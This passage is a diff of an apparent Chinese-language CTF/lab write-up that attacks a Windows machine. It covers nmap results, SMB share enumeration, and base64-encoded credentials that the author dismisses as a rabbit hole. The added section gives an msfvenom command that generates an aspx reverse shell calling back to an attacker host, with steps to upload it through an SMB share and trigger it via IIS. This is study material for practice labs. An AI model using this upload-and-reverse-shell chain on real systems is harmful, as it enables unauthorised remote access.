@@ -43,6 +43,18 @@ Host script results:
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
+
+以后unknown的端口都要好好扫扫，控了我两天。
+PORT      STATE    SERVICE VERSION
+49663/tcp open     http    Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+49666/tcp open     msrpc   Microsoft Windows RPC
+49668/tcp filtered unknown
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
 ```
 
 其中有smb有关的端口，可以使用smbclient枚举:  
@@ -54,7 +66,7 @@ Host script results:
 	ADMIN$          Disk      Remote Admin
 	C$              Disk      Default share
 	IPC$            IPC       Remote IPC
-	nt4wrksv        Disk      
+	nt4wrksv       Disk      
 ```
 尝试登录一下nt4wrksv：  
 ```smbclient //IP/nt4wrksv```
@@ -64,10 +76,22 @@ Host script results:
 Qm9iIC0gIVBAJCRXMHJEITEyMw==
 QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk%  
 ```
+
 第一个看上去像是base64：  
-```echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d```  
-```Bob - !P@$$W0rD!123% ```  
+```echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d```
+不知道为什么，使用终端解出来的会多一个%:  
+```Bob - !P@$$W0rD!123```  
 第二个好像也是base64(反正解出来了)：  
 ```Bill - Juw4nnaM4n420696969!$$$```
+好了，实锤了，上面的password是兔子洞。
+
+可以直接传反shell进去，使用msfvenom生成：
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o  reverse-shell.aspx
+```
+登陆进入smb使用put把反shell放进smb共享目录里，然后访问http://IP/nt4wrksv/reshell执行。
+
+
+
 
 ###
